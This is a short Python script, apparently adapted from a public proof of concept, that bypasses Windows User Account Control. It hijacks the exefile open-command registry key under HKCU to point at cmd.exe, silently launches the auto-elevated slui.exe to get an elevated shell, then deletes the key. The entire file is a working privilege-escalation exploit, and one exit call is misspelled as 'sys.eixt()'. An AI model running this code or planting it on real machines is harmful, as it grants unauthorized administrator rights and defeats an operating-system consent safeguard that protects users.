"""
https://github.com/bytecode-77/slui-file-handler-hijack-privilege-escalation/
	
slui.exe is an auto-elevated binary that is vulnerable to file handler hijacking
Read access to HKCU\Software\Classes\exefile\shell\open is performed upon         
execution. Due to the registry key being accessible from user mode, an arbitrary 
executable file can be provided. 
"""
import os
import sys
import time
import _winreg
import win32api
import win32con

def cmd_path():
	path = "c:/windows/system32/cmd.exe"

	if os.path.isfile(os.path.join(path)) == True:
		return os.path.join(path)
	else:
		return False

def slui_file_hijack():
	if (os.path.isfile(os.path.join("c:\windows\system32\slui.exe")) == True):
		try:
			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,"Software\Classes\exefile\shell\open\command")
			_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,cmd_path())
			_winreg.CloseKey(key)
		except Exception as error:
			return False

		try:
			win32api.ShellExecute(0,None,"c:\windows\system32\slui.exe",None,None,win32con.SW_HIDE)
		except Exception as error:
			sys.exit()

		time.sleep(5)
			
		try:
			_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,"Software\Classes\exefile\shell")
		except Exception as error:
			return False
	else:
		sys.eixt()